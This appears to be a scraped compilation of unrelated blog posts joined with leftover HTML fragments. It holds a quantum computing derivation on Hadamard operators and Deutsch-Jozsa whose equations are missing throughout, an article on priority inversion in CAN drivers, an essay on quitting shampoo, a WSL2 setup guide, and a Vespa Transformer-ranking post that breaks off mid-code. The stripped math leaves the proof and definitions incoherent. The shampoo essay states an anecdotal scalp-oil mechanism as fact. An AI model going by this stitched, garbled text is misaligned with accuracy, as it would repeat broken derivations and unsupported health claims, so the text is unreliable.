<h4 id="inner-product-and-inner-product-space-for-binary-vector-space">Inner Product and Inner Product Space for Binary Vector Space</h4>

<p>In the previous <a href="https://leimao.github.io/blog/Inner-Product/">blog post</a>, we have defined the inner product and inner product space for complex vector space. Similarly, we could also define the inner product and inner product space for binary vector space.</p>



<p>Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$, the inner product of $\mathbf{x}$ and $\mathbf{y}$ is defined as</p>



<p>which is somewhat similar to the inner product definition for real vector space.</p>



<p>The bitwise exclusive-or operation $\oplus$ was also defined for binary vectors $\mathbf{x}$ and $\mathbf{y}$ of the same length. Given two binary vectors $\mathbf{x}, \mathbf{y} \in \{0,1\}^n$, $\mathbf{x} = \{x_0, x_1, \cdots, x_{n-1}\}$ and $\mathbf{y} = \{y_0, y_1, \cdots, y_{n-1}\}$,</p>



<p>The following inner product properties are satisfied based on the above inner product definition.</p>



<p>Given $\mathbf{x}, \mathbf{x}^{\prime}, \mathbf{y}, \mathbf{y}^{\prime} \in \{0,1\}^n$, using the $\text{XOR}$ distributivity property we derived above,</p>



<p>Similarly,</p>



<p>Let $\mathbf{0} = \{ \underbrace{0, 0, \cdots, 0}_{n} \} =  0^n$, we have</p>



<h4 id="hadamard-operator">Hadamard Operator</h4>

<p>Hardmard operator is a special quantum operator, which could be represented using the following unitary matrix.</p>



<p>It is easy to see that</p>





<p>We denote</p>



<p>It is easy to see that $H$ is unitary, i.e., $H H^{\dagger} = H^{\dagger} H = I$ and $H^{\dagger} = H$. In fact, $H^{\otimes n}$ is unitary, and $(H^{\otimes n})^{-1} = H^{\otimes n}$.</p>



<p>For Kronecker product, the $A \otimes B$ is invertible if and only if both $A$ and $B$ are invertible and</p>



<p>It is easy to verify this using the <a href="https://leimao.github.io/blog/Kronecker-Product-In-Circuits/">Kronecker product mixed-product property</a>.</p>



<p>Therefore,</p>



<p>The values in the matrix $H^{\otimes n}$ follows specific patterns. Specifically,</p>



<p>where $\mathbf{i}$ is the binary vector representation for row number $i$, and $\mathbf{j}$ is the binary vector representation for column number $j$.</p>



<p>Since I did not find any proof from the Internet, I would like to derive a simple proof using mathematical induction.</p>



<p>For the base case for $n = 1$, it is easy to verify that</p>



<p>where $i, j \in [0, 2^1)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{1}$.</p>



<p>Assuming for $n = k - 1$,</p>



<p>where $i, j \in [0, 2^{k-1})$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k - 1}$.</p>



<p>For $n = k$, we have</p>



<p>Note that $H^{\otimes {k-1}}$ is a $2^{k-1}$ by $2^{k-1}$ matrix.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 0$.</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [0, 2^{k-1})$.</p>



<p>For $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 0$, and $j_0 = 1$.</p>



<p>Therefore,</p>



<p>where $i \in [0, 2^{k-1})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>For $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$,</p>



<p>where $\mathbf{i}^{\prime} = \mathbf{i}_{1:}$, and $\mathbf{j}^{\prime} = \mathbf{j}_{1:}$, $i_0 = 1$, and $j_0 = 1$.</p>



<p>Based on the reducing sum or difference to boolean property we derived above,</p>



<p>Therefore,</p>



<p>where $i \in [2^{k-1}, 2^{k})$ and $j \in [2^{k-1}, 2^{k})$.</p>



<p>Taken together, for $n = k$,</p>



<p>where $i, j \in [0, 2^k)$, i.e., $\mathbf{i}, \mathbf{j} \in \{0, 1\}^{k}$.</p>



<p>This finishes the mathematical induction and concludes the proof.</p>



<p>Note that the entries of the first column and the entries of the first row of $H^{\otimes {n}}$ have exactly the same value, $\frac{1}{\sqrt{2^{n}}}$. This is because</p>





<p>Equivalently, we might write, $H^{\otimes {n}}_{0,:} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$ and $H^{\otimes {n}}_{:,0} = \frac{1}{\sqrt{2^{n}}} \mathbf{1}$.</p>



<p>To extract an arbitrary column $j$ from $H^{\otimes {n}}$, we prepared a one-hot quantum system basic state vector $| \mathbf{y} \rangle = [y_0, y_1, \cdots, y_{2^n-1}]^{\top}$, where $y_j = 1$ and $y_k = 0$ for $k \neq j$.</p>



<p>where $| \mathbf{x}_i \rangle$ is a quantum system one-hot basic state vector,  $|\mathbf{x}_i\rangle = [x_0, x_1, \cdots, x_{2^{n}-1}]^{\top}$, where $x_i = 1$ and $x_k = 0$ for $k \neq i$.</p>



<p>Since $H^{\otimes {n}}$ is unitary and $(H^{\otimes {n}})^{-1} = H^{\otimes {n}}$as we have discussed above,</p>



<p>For example, if $j = 0$, $| \mathbf{y} \rangle = [\underbrace{1, 0, 0, \cdots, 0}_{2^n} ]^{\top} = | \mathbf{0} \rangle$,</p>



<h3 id="deutsch-jozsa-algorithm">Deutsch-Jozsa Algorithm</h3>

<p>The black-box $f(\mathbf{x})$ is represented using a quantum gate $U_f$. Our job is to determine whether the $f(\mathbf{x})$ corresponding to the $U_f$ is constant or balanced.</p>

<div>
<figure>

    <figcaption>$U_f$</figcaption>
</figure>
</div>

<p>The quantum gate $U_f$ is a unitary matrix which maps from $| \mathbf{x} \rangle \otimes | y \rangle$ to $| \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, namely $U_f (| \mathbf{x} \rangle \otimes | y \rangle) = | \mathbf{x} \rangle \otimes | f(\mathbf{x}) \oplus y \rangle$, for $x \in \{0, 1\}^n$ and $y \in \{0, 1\}$. When $y = 0$, $| f(\mathbf{x}) \oplus y \rangle = | f(\mathbf{x}) \oplus 0 \rangle = | f(\mathbf{x}) \rangle $, $| y \oplus f(\mathbf{x}) \rangle$ is just $| f(\mathbf{x}) \rangle$.</p>



<p>Note that the above mapping is only necessarily valid when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions.</p>



<p>Let’s further check when $| \mathbf{x} \rangle$ and $| y \rangle$ are superpositions, what the outputs from $U_f$ will be. Perhaps we could achieve fewer runs with superpositions.</p>

<h4 id="first-attempt">First Attempt</h4>

<p>In the first attempt, we made the second input to $U_f$ a superposition, which is achieved by applying a Hadamard operator to the second input $|1\rangle$. This is almost the same as what we did in the second attempt in the <a href="https://leimao.github.io/blog/Deutsch-Algorithm/">Deutsch algorithm</a>. The superposition is</p>

</div>







<p>Because $\frac{|f(\mathbf{x})\rangle - |\overline{f(\mathbf{x})}\rangle}{\sqrt{2}}$ is either $\frac{|0\rangle - |1\rangle}{\sqrt{2}}$ or $\frac{|1\rangle - |0\rangle}{\sqrt{2}}$, $|\varphi_2\rangle $ could be further simplified as</p>



<p>The observation from the first output is always the same to the first input, whereas there …</p></div></div>

    <p>The problem of <strong>priority inversion</strong> is well-known and.. actually, scratch that: it’s clearly not well known at all because people keep making the
same mistake. So I’m writing this to try and explain the problem (with reference to CAN) in the hope that a search engine indexes this and puts
it high enough up the search results for people to find.</p>

<p>The TL;DR for priority inversion:</p>

<blockquote>
  <p>Priority inversion causes a high priority activity to get delayed for a long time, causing missed deadlines, timeouts, and all kinds of
consequent faults. Worse, it’s typically an intermittent problem often not found in testing, and a great source of Heisenbugs because adding
instrumentation to look at it can make it go away.
It happens when the high priority (and urgent) activity gets stuck behind a low priority (non-urgent) activity and
lots of medium priority activities block the low priority activity, which is blocking the high priority activity.</p>
</blockquote>

<p>The word ‘activity’ here can mean tasks in a real-time system, scheduled by an RTOS (real-time operating system) that chooses what to run
based on priorities.  This is exactly what happened on Mars on the 4th July 1997 when the Mars Pathfinder mission landed.</p>

<p><img src="https://kentindell.github.io/assets/384_pathfinder.jpg" alt="Mars Pathfinder"></p>

<p>The spacecraft control system kept going through watchdog resets, triggered because
a high priority task didn’t complete in time. The problem was down to priority inversion around access to a resource guarded by a semaphore. A low
priority task had the resource locked, and the high priority task was blocked waiting for the low priority task to release the semaphore.
But the low priority task couldn’t run because medium
priority tasks were running, so it couldn’t unlock the semaphore, and so the high priority task got stuck, the watchdog triggered, the system reset,
and the process repeated. You can read more about it directly from the
<a href="https://www.cs.unc.edu/~anderson/teach/comp790/papers/mars_pathfinder_long_version.html">horse’s mouth</a>
(Glenn Reeves, the NASA team lead for the Pathfinder spacecraft software).</p>

<p>Priority inversion also happens in CAN. The CAN protocol uses priorities (in the form of CAN IDs) to determine which frame is transmitted on the bus.
But the CAN specification says nothing about how frames <em>within</em> a CAN controller are arbitrated. What <em>should</em> happen is that frames are internally
arbitrated by priority, so that the frame the CAN engine enters into bus arbitration is the highest of its own frames, and then the CAN bus arbitration
picks the highest priority frame bus-wide. But if a FIFO queue is used internally then we get priority
inversion.</p>

<p>Here’s a short video showing how priority inversion plays out on CAN bus:</p>

<p>
  <iframe src="https://www.youtube.com/embed/0xkZ8glPSXA" width="700" height="480" frameborder="0" allowfullscreen="">
  </iframe>
</p>

<p>This isn’t a theoretical problem. Let’s take a look at the <a href="https://zephyrproject.org/">Zephyr Project</a> CAN system.
The <a href="https://docs.zephyrproject.org/latest/reference/networking/can_api.html">CAN API</a> is very simple, with just a <code>can_send</code> call to queue a CAN frame
(a callback can be set for a “sent” event). There’s nothing inherently wrong with this API. If the number of buffer slots supports is small then there is
pressure on the application developer to create their own queue in software, and inevitably this will be a FIFO queue (I’ll come back to this shortly).
The problem is deeper in the drivers. Here is a code snippet from the
code for the <a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_stm32.c">STM32 CAN controller driver</a>:</p>

<div><div><pre><code>	/* Set TX priority to chronological order */
	can-&gt;MCR |= CAN_MCR_TXFP;
</code></pre></div></div>

<p>The bit <code>TXFP</code> is described in the STM32 reference manual for the bxCAN CAN controller as follows:</p>

<blockquote>
  <p>“The transmit mailboxes can be configured as a transmit FIFO by setting the <code>TXFP</code> bit in the <code>CAN_MCR</code> register. In this mode the priority order is
given by the transmit request order. This mode is very useful for segmented transmission.</p>
</blockquote>

<p>Yep, we have a priority inversion problem with these drivers. Let’s look at the <code>can_send</code> function in the
<a href="https://github.com/zephyrproject-rtos/zephyr/blob/master/drivers/can/can_mcux_flexcan.c">NXP FlexCAN drivers</a>:</p>

<div><div><pre><code>	while (true) {
		alloc = mcux_get_tx_alloc(data);
		if (alloc &gt;= 0) {
			if (atomic_test_and_set_bit(data-&gt;tx_allocs, alloc)) {
				continue;
			}

			break;
		}

		if (k_sem_take(&amp;data-&gt;tx_allocs_sem, timeout) != 0) {
			return CAN_TIMEOUT;
		}
	}
</code></pre></div></div>

<p>The NXP FlexCAN controller is a slotted buffer controller, which means it has lots of CAN frame buffer slots in its memory, allocated between sending
and receiving CAN frames.  The controller can be set to arbitrate between its frames by buffer number or by CAN ID. The driver selects arbitration by 
buffer number and then in the <code>can_send</code> function they allocate a buffer higher than any buffer in use, in order to preserve FIFO transmission order:</p>

<div><div><pre><code>	/* mcux_get_tx_alloc is a linear on array, and binary on atomic_val_t search
	 * for the highest bit set in data-&gt;tx_allocs. 0 is returned in case of an empty
	 * tx_alloc, the next free bit otherwise.
	 * The reason to always use a higher buffer number than the current in use is
	 * that a FIFO manner is kept. The Controller would otherwise send the frame
	 * that is in the lowest buffer number first.
	 */
</code></pre></div></div>

<p>So this driver specifically implement FIFO buffering, which is bad enough, but worse than that is that it spins waiting for a free buffer,
where “free” doesn’t mean buffer without a CAN frame in it, but one where the buffer number is
higher than any frame in the controller. What will tend to happen under peak bus load is that the buffer number will ‘walk’ up to the top one,
and then when that buffer contains a
low priority frame, the task will spin on a sequence of CAN transmit events for ages waiting for it to be put into the (this could be tens or
hundreds of milliseconds on a busy CAN bus).
In essence, this couples priority inversion on the CAN bus to task execution, causing a task
to overrun and fail in unpredictable ways. And it’s an intermittent problem that probably won’t appear in testing. Obviously this is a terrible driver design.</p>

<p>It may look like I am picking on the Zephyr Project, but far from it: I’ve come across it in many other CAN drivers too, <strong>even in a self-driving
car system</strong> where the steering depended on sending a CAN frame with a short latency!</p>

<p>So how is priority inversion solved? What is required to solve it? In short, the CAN frame queueing in the CAN driver must be by CAN ID value, using the same
ordering as on the CAN bus. For CAN controllers that support a large number of messages then this is usually as simple as flipping a bit to ask the controller
to arbitrate internally this way (the FlexCAN and the bxCAN controllers by default come out of reset in this mode!).</p>

<p>For CAN controllers with only three
buffers then the software drivers must keep a bigger priority queue in memory and then shuffle the frames back and forth to keep the highest priority three
frames in the hardware. All these controllers provide an an abort mechanism so that a low priority CAN frame in a hardware buffer can be thrown out and
replaced by a new higher priority frame. The CAN controllers are generally designed to help with this: the bxCAN has a <code>CODE</code> field and the FlexCAN
has a <code>LPTM</code> field to indicate which of the transmit buffers is the lowest-priority one.</p>

<p>Note that the common Microchip MCP2515 standalone CAN controller has three transmit buffers, but it doesn’t arbitrate internally by CAN ID (there is a
2-bit priority field for each buffer, but this won’t work because the priorities would need to be atomically re-ordered when a new
frame is put in the controller). It’s simpler to just use a single buffer and use the abort mechanism when a low-priority frame needs to 
be pre-empted.</p>

<p>One final point worth discussing is why people are so attracted to FIFO queueing of CAN frames (even to the point of disabling the default priority queueing
in CAN controllers)? One answer to this is <em>segmented messages</em>: quite a few CAN layers define ways to map a message longer than 8 bytes into a
sequence of 8-byte CAN
frames, and this nearly always is done by transmitting a sequence of CAN frames with the same ID. It’s obviously vital that these
frames go into FIFO order because otherwise the bigger message is scrambled. The problem with queueing by CAN priority is that
under nearly all priority queueing implementations (both hardware and software), two internal frames with the same ID are entered into arbiration in an
undefined transmission order (for example, the FlexCAN hardware uses an internal hardware scanning state machine that loops around all the buffers
looking for the lowest priority frame). The solution to this
is not, of course, to make all CAN frames go in FIFO order, but to make only frames for a segmented message go in FIFO order <em>with respect to each other</em>. This
is actually straightforward to implement using a higher-level FIFO driver, that creates a FIFO queue of frames and then hands them to the CAN driver 
one-by-one as each previous frame is sent.</p>

<p>So to summarise:</p>

<ul>
  <li>Priority inversion is a big deal, it’s an intermittent problem that might escape testing but could be catastrophic when deployed</li>
  <li>Priority inversion happens on CAN</li>
  <li>It is fixed by having the hardware arbitrate internally by CAN ID</li>
  <li>If there aren’t enough buffers in hardware then the driver should implement them in software using the abort feature of the CAN hardware and not just push the problem up to the application (which will inevitably just use a FIFO queue)</li>
  <li>Where FIFO sending is important (e.g. segmented messaging) it should be done by a specific higher level FIFO queueing system that creates separate FIFO queues and puts the head item of each FIFO into the priority queue.</li>
</ul>

<p>UPDATE 2020/07/01:</p>

<ul>
  <li>I have rewritten the wording on CPU execution being coupled to priority inversion to make it clear the task is spinning on a transmit event rather than the CPU itself spinning in a loop</li>
  <li>As a courtesy I reported this priority inversion issue to the Zephyr Project; it was subsequently reclassified from “bug” to “enhancement” because not suffering from priority inversion is apparently a ‘nice to have’ feature of an RTOS designed for safety critical systems</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>In December 2019, my girlfriend mentioned that my hair smelled unusually good. What was I doing differently? Nothing, I thought. Everything was just as always. Except that I had run out of shampoo a few weeks prior, and hadn’t noticed until then.</p> <p>As a teen, I used plenty of hair products. Gels were cool in the early 2000s, and sculpting wax remained in vogue even afterwards. Such products require washing out at the end of the day, otherwise it feels gross, and (ironically) would make your hair unwieldy afterwards. By the time I got to college, I was used to shampooing my hair most days.</p> <p>However, my college roommate suffered from severe male pattern balding as he hit his early 20s, and he made that suffering a core piece of his identity. Fear is contagious, so I quit hair products, and began to exclusively use the most scalp-friendly shampoo I could find, <a href="https://www.kiehls.com/hair/shampoos/amino-acid-shampoo/247.html">Kiehl’s Amino Acid Shampoo</a>. I reduced my shampooing to twice a week, and was careful not to use too much.<sup id="fnref:1"><a href="#fn:1">1</a></sup> My hair was fine and usually short, so that was perfectly sufficient for the most part of the last decade.</p> <p>That was until I ran out in mid-November 2019. I hadn’t even noticed, and my girlfriend had complimented me on my hair, so I thought I might as well keep going. I had previously read about the <a href="https://www.reddit.com/r/NoPoo/">NoPoo Movement</a> – people washing their hair with stuff like olive oil or quitting shampoo altogether – and that had been intriguing. Ever since I tried anti-dandruff shampoo and it immediately gave me dandruff, I had a hunch that shampoo might just be a scam. I was ready to give NoPoo a try.</p> <p>Seven or eight months later, I still haven’t used shampoo or conditioner once. I rinse it with warm water every morning when I shower, give it a quick rub with a towel, brush it, and I’m off to the races.</p> <p>The results are fantastic. My hair is silky smooth, looks and feels clean, and a slight build-up of natural oils makes it easy to form. If I run my hand through my hair to push it back, it stays (mostly) in place.</p> <p>Keeping my hair in place had been a real frustration with a frequent shampooing routine: my hair would be so light and dry that it was impossible to rule – I would <em>have</em> to use a product to keep it from dangling into my forehead, or I’d have to get haircuts to specifically trim the unruly parts that would stick out. Reducing shampoo – and eventually eliminating it – made it possible to actually get somewhere combing it.</p> <p>During this time – thanks to COVID-19 – I haven’t had a haircut, so my hair is now also longer than usual. (I feel like a stand-in from an ’80s movie.) It’s easy to go NoPoo when you have short hair, because there’s ultimately little hair to accumulate lots of grease and oil. The threat of greasy hair is more severe when your hair is longer, which is why I suspect it’s mostly men<sup id="fnref:2"><a href="#fn:2">2</a></sup> who opt to abandon shampoo. For me, it ended up fine.</p> <p>Abandoning shampoo works because it restores the natural balance of oils on your scalp. Most shampoos are effectively like dish soap: they aggressively remove grease from your head. That dries out your scalp, so – no surprise – you produce <em>more</em> oils to compensate. That makes your hair greasy in short order, so you then have to shampoo again. It’s even more extreme if you apply additional grease in form of hair products. Like a ketamine-cocaine bender, you are net balanced while swinging between extremes. That’s not great. Consequently, most people report that the toughest thing about abandoning shampoo is the first two or three weeks, while your hair becomes quite greasy as your scalp readjusts how much oil it needs to produce. I was fortunate that during that time, I had been too busy to notice.</p> <p>I hope to get a haircut soon as COVID wraps up, but I don’t see myself using shampoo again in the course of my everyday life. It might be worth making exceptions if I somehow get really dirty in nature or doing some DIY stuff,<sup id="fnref:3"><a href="#fn:3">3</a></sup> but for the most part it just seems unnecessary.</p> <hr>  <br> </article> </div></div>]]>

<![CDATA[Setup Dev Env on Windowns with WSL2]]>

July 4, 2020 | https://gaurav.koley.in/2020/setup-development-env-on-windows | <a href="https://web.archive.org/web/*/https://gaurav.koley.in/2020/setup-development-env-on-windows">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>I had been living the "Windows free" life for almost 10 years even since I switched over to first <a href="https://www.linuxmint.com/">Linux Mint</a>, then <a href="https://ubuntu.com/">Ubuntu</a> and lately <a href="https://pop.system76.com/">Pop!_OS</a>. Over these years, I went to university, learnt programming and earned 2 degrees in Computer Science, all the while programming on Ubuntu/the CLI. </p>

<p>This changed in 2019 when I joined Microsoft as a Software Engineer and I had to familiarize myself with coding on Windows. Since then, I have worked on Windows for .NET, C# and several Nodejs projects but never did any heavy lifting like Python or Ruby on Rails. (If you are familiar with my blog, my personal projects revolve mostly around Ruby on Rails and VueJS.) </p>

<p>So when Microsoft announced WSL 2, I had to try it out! I've always wanted to play games on Windows as well code, but switching my entire workflow to Windows from Pop!_OS wasn't quite seamless as I wanted — so I was ready for an upgrade. </p>

<h3>Install WSL 2</h3>

<ul>
<li>Jump on the Windows Insider Program by joining in the Settings. You'll need to be on build 18917 or above, which means you can choose either the Dev or Beta channel — the latter of which is more stable.</li>
<li>Once you're up and running, <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">Install WSL 2 with the Linux flavor of your choice</a>.</li>
<li>Download and install the <a href="https://docs.microsoft.com/en-us/windows/wsl/wsl2-kernel">Linux kernel update package</a>.</li>
<li>And done! To make the environment seamless, try out <a href="https://www.microsoft.com/en-us/p/windows-terminal-preview/9n0dx20hk701">Microsoft's new Terminal</a> to switch between your Linux installs on demand.</li>
</ul>

<h3>Install Docker</h3>

<p>Download and install <a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows/">Docker Desktop Stable 2.3.0.2</a> or a later release. </p>

<p>After installation, on the Docker Deskop app, do the following steps:</p>

<ol>
<li>From the menu, select Settings &gt; General.</li>
<li><p>Select the Use WSL 2 based engine check box. If you are using Windows 10 Home, this will be checked by default.</p>

<p><img src="https://gaurav.koley.in/public/images/wsl_enable.png" alt="WSL Enable"></p>

<p>Optionally, select any additional distributions you would like to access docker from, by going to Resources &gt; WSL Integration.</p>

<p><img src="https://gaurav.koley.in/public/images/wsl_select.png" alt="WSL Select"></p></li>
<li><p>Click Apply &amp; Restart.</p></li>
</ol>

<p>Now you will be able to access docker and docker-compose within your WSL 2 installations too (and these work like native Ubuntu, so most of your existing docker and docker-compose scripts should work just fine). </p>

<p>Fire up Windows Terminal and from the dropdown at the top, you should be able to get a bash shell to your WSL distro. </p>

<p><img src="https://gaurav.koley.in/public/images/terminal.png" alt="Terminal"></p>

<p><em>Profit!</em></p>

<h3>Install VS Code with Remote WSL Extension</h3>

<p>If you don't use VS Code, now is the perfect time to give it a try. Pair it with the <a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl">Remote WSL Extension</a> and from your terminal, launch into Visual Studio Code using <code>code .</code> from your WSL bash. You can even use <code>wsl code .</code> to switch to Linux inline from Command Prompt or Powershell, launch into VS Code, then return to your Windows shell. :D</p>

<p>Personally, I'm using WSL 2 for 100% of my development on Windows – all dev tools such as Git and Node.js are installed in my Linux environment. </p>

<p>Here's a look at me writing this post on WSL:</p>

<p><img src="https://gaurav.koley.in/public/images/vscode.png" alt="VS Code Setup"></p>

<p>In the screenshot, it is visible that I'm connected to my WSL 2 instance (see 'WSL:Ubuntu' in the bottom-left as the remote source). Also notice that my line endings are defaulted to LF (shown in the Status bar) without having to set any additional Git configuration options - if you're on Windows working in open source, you understand why this is a big deal. Also all my favorite extensions work and are targeting the correct environment. </p>

<p>With WSL 2, Windows has come a long way as a preferred programming platform and hopefully as the community matures, we would see more tightly integrated tools being ported from Linux to Windows. </p>

                <p>It really isn’t an exaggeration to claim that the field of NLP has been
revolutionized in the last year or so by the introduction of the Transformer
and related models such as the Bidirectional Encoder Representations from
Transformers (BERT). Indeed, BERT has since it’s release dominated various
leaderboards on NLP related tasks such as <a href="https://microsoft.github.io/msmarco/">MS
MARCO</a>. Extending beyond research, a
growing number of companies have shown considerable interest in adopting these
models for production.</p>

<p>One of the reasons for this is the ease of getting started. This is in large
part due to <a href="https://huggingface.co/">Hugging Face</a> and it’s open-source
<a href="https://github.com/huggingface/transformers">Transformers library</a>. With this
library it’s easy to start with any of the thousand or so pretrained base
models, and fine-tune it to a specific task such as text classification,
translation, summarization, text generation or question/answering. This is an
attractive proposition considering that some of these base models are immense,
requiring huge amounts of data and computational resources to train. The cost
of training can sometimes run into the millions of dollars. In contrast, taking
a base model and fine-tuning it requires much less effort, making powerful NLP
capabilities available to a larger community.</p>

<p>Recently it has also become easier to deploy and serve these models in
production. The Transformers library has <a href="https://medium.com/microsoftazure/accelerate-your-nlp-pipelines-using-hugging-face-transformers-and-onnx-runtime-2443578f4333">added functionality to export models to
ONNX</a>,
allowing for greater flexibility in model serving since this is largely
independent from whether or not the model was trained on Tensorflow or PyTorch.
We’ve been working a lot lately on being able to evaluate Transformer models in
Vespa, so in this blog post we thought we would share a bit on how we perceive
the benefits of inference on Vespa, show how to use a transformer model in
ranking with a small sample application, and discuss future directions we are
working toward.</p>

<h3 id="why-vespa">Why Vespa?</h3>

<p>A common approach to serve machine learned models in general is to set up a
model server and call out to this service from somewhere in your serving stack.
This is fine for tasks that evaluate a single data point for each query, for
instance classification, text generation or translation. However, for certain
application types such as search and recommendation <a href="https://blog.vespa.ai/the-hardest-problem-in-computing/">this can become a scalability
bottleneck</a>, as these
applications need to evaluate the model with a potentially large number of
items. One can quickly reach network saturation due to the multiplicative
effect of number of queries per second, data points per query, and
representation size.</p>

<p><img src="https://blog.vespa.ai/assets/2020-07-02-introducing-nlp-with-transformers-on-vespa/external_model_server.png" alt="Evaluating models on an external model server"></p>

<p>One of the guiding principles in Vespa is to move the computation to the data
rather than the other way around. Vespa is a distributed application that
consists of a set of stateless nodes and a set of stateful content nodes which
contains the data. A query is first processed on the stateless layer before
being fanned out to the content nodes. The content nodes handle data-dependent
computation and each return their results back to the stateless layer where the
globally best results are determined.</p>

<p><img src="https://blog.vespa.ai/assets/2020-07-02-introducing-nlp-with-transformers-on-vespa/models_on_content_nodes.png" alt="Evaluating models on the content nodes"></p>

<p>So when deploying a Vespa application, the machine learned models are
automatically deployed to all content nodes, and evaluated there for each
query. This alleviates the cost of query time data transportation. Also, as
Vespa takes care of distributing data to all content nodes and redistributing
elastically, one can scale up computationally by adding more content nodes thus
distributing computation as well. Additionally, this reduces system complexity
as there are fewer production services to maintain. This last point is
something which one should not discount.</p>

<p>One of the really unique features of Vespa is the flexibility one has to
combine results from various features and string models together. For instance,
one could use a small, fast model in an early phase, and a more complex and
computationally expensive model that only runs on the most promising
candidates. From a text search perspective that could be BM25 combined with a
Transformer model. For instance:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre>rank-profile bm25_and_transformer {
    first-phase {
        expression: bm25(content)
    }
    second-phase {
        rerank-count: 10
        expression: onnx("bert.onnx")
    }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This is an example of how to instruct Vespa to calculate the BM25 score as a
first stage and send the top 10 candidates to the BERT model. Note that this is
per content node, so with 10 content nodes, the BERT model is running
effectively on 100 data points.</p>

<p>Evaluation of models from different platforms such as Tensorflow, PyTorch,
XGBoost and LightGBM can be freely combined as well, even within the same
expression. To efficiently search for potential candidates one can use WAND.
Recently we’ve also added <a href="https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/">approximate nearest
neighbors</a>,
giving the option of a highly performant nearest neighbor search which can
naturally be based on textual representation as well.</p>

<p>In summary, Vespa offers ease of deployment, flexibility in combining many
types of models and computations out of the box without any plugins or
extensions, efficient evaluation without moving data around and a less complex
system to maintain. This makes Vespa an attractive platform.</p>

<h3 id="ranking-with-transformers">Ranking with Transformers</h3>

<p>For a taste of how to use Transformer models with Vespa we’ve added a small
sample application:
<a href="https://github.com/vespa-engine/sample-apps/tree/master/transformers">https://github.com/vespa-engine/sample-apps/tree/master/transformers</a>.
In this sample app we use the MS MARCO dataset which combines both queries,
content and relevance judgements. For the purposes of this sample, we won’t
fine-tune the model and will just use the base model as-is. Our goal is to set
up a Vespa application that indexes the documents and scores content based on a
BM25 stage followed by a Transformer stage. The sample app contains a README
that goes through all the steps, but here we’ll discuss some of the highlights.</p>

<p>One decision that needs to be made is which Transformer model to use. It’s
worth mentioning that large models have a significant computational cost which
has a direct impact on performance and the scalability of the application. So
to keep latency down we use a fairly small model (“nboost/pt-tinybert-msmarco”)
for this sample application. We download and export the model to ONNX using the
Transformers library. Our export script builds upon the official
<code>convert_graph_to_onnx.py</code> rather than using it directly because we want to use
the equivalent of the Transformer <code>AutoModelForSequenceClassification</code>, and the
official export script does not export the additional tensors required for the
linear transformation on top of the base model. The script puts the exported
model into the “models” directory of the Vespa application package where it
will ultimately be imported and distributed automatically to all content nodes.</p>

<p>We also need to create the data feed. As part of evaluating any Transformer
model, text needs to be tokenized. The tokenizer is part of the model as the
model is dependent upon stable tokenization during both training and inference.
For the purposes of this sample app, we have not implemented a tokenizer in
Vespa, meaning that we handle tokenization outside of Vespa. So in the
conversion of MS MARCO data to a Vespa feed, we also use the model’s tokenizer
to generate tokens for each piece of content. This means that when querying
Vespa, we currently need to send in the tokenized representation of the query
as well. In a follow-up post we will show how to port a tokenizer and use that
during document and query processing in Vespa.</p>

<p>Putting these together, we need to decide which fields to index for each piece
of content as well as how to compute each result. This means defining a
document schema which includes setting up expressions for how candidates for
retrieval should be calculated. The fields we set up for this sample
application are:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td><pre>field id type string {
    indexing: summary | attribute
}
field title type string {
    indexing: index | summary
}
field url type string {
    indexing: index
}
field body type string {
    indexing: index
}
field tokens type tensor&lt;float&gt;(d0[128]) {
    indexing: attribute
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The <code>id</code>, <code>title</code>, <code>url</code> and <code>body</code> fields come directly from MS MARCO. The
<code>tokens</code> field stores the token sequence from the tokenizer mentioned above. Note
that we’ve decided upon a  sequence length of 128 here to keep sizes small. The
cost of evaluating Transformer type models is generally quadratic in relation
to the sequence length, so keeping them short has significant gains in
performance. This means that we only store the first 128 tokens for each
document. The documents in MS MARCO are significantly larger than that however,
and a common way of handling that is to instead index up each paragraph, or
perhaps even each sentence, for every document. However, we have not done that
explicitly in this application.</p>

<p>We also need to define how to compute each result. Evaluating the model is
fairly easy in Vespa:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre>rank-profile transformer {
    first-phase {
